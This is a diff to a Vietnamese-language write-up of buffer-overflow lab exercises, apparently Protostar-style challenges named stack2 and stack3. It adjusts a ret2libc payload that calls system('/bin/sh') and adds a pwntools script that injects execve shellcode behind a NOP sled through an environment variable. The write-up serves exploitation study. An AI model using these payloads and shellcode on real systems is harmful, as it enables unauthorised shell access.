@@ -42,12 +42,31 @@ info('system_addr: ' + hex(system_addr))
 #/bin/sh address
 sh_addr = 0xf7dd0000+ 0x18e363 #base address + offset
 info('sh_addr: ' + hex(sh_addr))
-padding = b"a"*64+p32(0x08048477)+b"a"*12   #padding tính từ phần trên
+padding = b"a"*84   #padding tính từ phần trên
 payload = padding + p32(system_addr) + p32(0xdeadbeef) + p32(sh_addr)
 #run process, export GREENIE = payload
-p = process('./stack3')
-p.sendline(payload)
+p = process(['./stack2'], env={'GREENIE': payload})
 p.interactive()
 ```
 
 ### inject shellcode
+
+Bài này vấn đề lớn nhất chắc là tìm được offset phù hợp và nop_slide size. Sau một hồi thử thay vài số thì mình đã tìm được.
+
+```python
+#!/usr/bin/python3
+from pwn import *
+
+padding = b"a"*84
+eip = p32(0xffffd2c0+1000) # esp addr + offset nop_slide
+
+nop_slide = b"\x90"*2000
+
+shellcode = b"jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
+#run process, export GREENIE = payload
+payload = padding + eip + nop_slide + shellcode
+f = open("env", "wb")
+f.write(payload)
+p = process(['./stack2'], env={'GREENIE': payload})
+p.interactive()
+```
